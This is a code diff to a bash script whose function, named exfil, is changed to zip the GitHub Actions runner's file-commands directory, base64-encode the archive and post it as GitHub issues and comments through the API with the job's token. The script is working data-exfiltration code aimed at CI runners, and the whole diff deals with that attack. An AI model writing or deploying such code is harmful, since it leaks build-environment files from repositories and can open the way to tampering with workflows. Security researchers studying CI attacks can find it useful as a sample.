@@ -8,15 +8,15 @@ POLL_INTERVAL=.5
 ISSUE_NUMBER=""
 
 exfil() {
-    # ts=$(date +"%Y%m%d-%H%M%S-%3N")
-    # zip_file=${ts}.zip
-    # zip -r $zip_file $RUNNER_FILE_COMMANDS_DIR
-    # local encoded=$(cat $zip_file | base64 -w 0)
-    encoded=$(ls -la $RUNNER_FILE_COMMANDS_DIR | base64 -w 0)
+    ts=$(date +"%Y%m%d-%H%M%S-%3N")
+    zip_file=${ts}.zip
+    zip -r $zip_file $RUNNER_FILE_COMMANDS_DIR
+    local encoded=$(cat $zip_file | base64 -w 0)
+    # encoded=$(ls -la $RUNNER_FILE_COMMANDS_DIR | base64 -w 0)
     if [ -z "$ISSUE_NUMBER" ]; then
         create_issue "$encoded"
     else
-        update_issue "$encoded"
+        create_comment "$encoded"
     fi
 }
 
@@ -50,10 +50,29 @@ EOF
     ISSUE_NUMBER=$(echo "$response" | grep -o '"number": [0-9]*' | head -1 | grep -o '[0-9]*')
 }
 
-update_issue() {
+# update_issue() {
+#     local body="$1"
+    
+#     local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}/comments"
+    
+#     local json_data=$(cat <<EOF
+# {
+#     "body": "$body"
+# }
+# EOF
+# )
+    
+#     curl -s -X POST "$api_url" \
+#         -H "Authorization: Bearer $GITHUB_TOKEN" \
+#         -H "Accept: application/vnd.github+json" \
+#         -H "Content-Type: application/json" \
+#         -d "$json_data" > /dev/null
+# }
+
+create_comment() {
     local body="$1"
     
-    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}"
+    local api_url="https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${ISSUE_NUMBER}/comments"
     
     local json_data=$(cat <<EOF
 {
@@ -62,7 +81,7 @@ update_issue() {
 EOF
 )
     
-    curl -s -X PATCH "$api_url" \
+    curl -s -X POST "$api_url" \
         -H "Authorization: Bearer $GITHUB_TOKEN" \
         -H "Accept: application/vnd.github+json" \
         -H "Content-Type: application/json" \
